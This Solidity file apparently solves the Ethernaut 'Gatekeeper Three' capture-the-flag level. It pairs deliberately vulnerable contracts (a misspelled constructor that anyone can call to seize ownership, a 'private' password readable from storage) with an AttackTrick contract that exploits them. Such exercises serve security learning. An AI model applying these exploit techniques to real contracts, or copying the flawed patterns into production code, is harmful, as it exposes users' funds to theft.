// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleTrick {
  GatekeeperThree public target;
  address public trick;
  uint private password = block.timestamp;

  constructor (address payable _target) {
    target = GatekeeperThree(_target);
  }
    
  function checkPassword(uint _password) public returns (bool) {
    if (_password == password) {
      return true;
    }
    password = block.timestamp;
    return false;
  }
    
  function trickInit() public {
    trick = address(this);
  }
    
  function trickyTrick() public {
    if (address(this) == msg.sender && address(this) != trick) {
      target.getAllowance(password);
    }
  }
}

contract GatekeeperThree {
  address public owner;
  address public entrant;
  bool public allow_enterance = false;
  SimpleTrick public trick;

  function construct0r() public {
      owner = msg.sender;
  }

  modifier gateOne() {
    require(msg.sender == owner);
    require(tx.origin != owner);
    _;
  }

  modifier gateTwo() {
    require(allow_enterance == true);
    _;
  }

  modifier gateThree() {
    if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
      _;
    }
  }

  function getAllowance(uint _password) public {
    if (trick.checkPassword(_password)) {
        allow_enterance = true;
    }
  }

  function createTrick() public {
    trick = new SimpleTrick(payable(address(this)));
    trick.trickInit();
  }

  function enter() public gateOne gateTwo gateThree returns (bool entered) {
    entrant = tx.origin;
    return true;
  }

  receive () external payable {}
}
contract AttackTrick {
    SimpleTrick public trick;
    GatekeeperThree public gate;


    constructor(address payable _gate) payable {

        gate = GatekeeperThree(_gate);
        
    }

    function setTrick() public returns(address){
        gate.createTrick();
        return address(trick);
    }

    function getPassword(uint256 _password) public {
        gate.getAllowance(_password);
        require(gate.allow_enterance() == true, "password is wrong");
    }
    

    function enter() public {
        gate.construct0r();
        gate.enter();
    
    }



    //password should be at storage slot 2 of SimpleTrick
    //then call the c0nstructor function, make sure the contract 
    //has been initialized with 0,001 ether for gate 3.

}